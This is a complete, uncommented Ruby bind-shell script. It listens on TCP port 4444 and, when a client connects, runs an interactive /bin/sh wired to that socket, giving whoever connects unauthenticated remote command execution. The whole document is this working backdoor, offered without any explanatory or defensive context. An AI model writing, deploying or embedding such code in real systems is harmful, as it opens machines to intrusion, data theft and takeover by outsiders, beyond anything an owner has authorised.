require 'socket'

port=4444

server = TCPServer.new port
client = server.accept

exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",client,client,client)
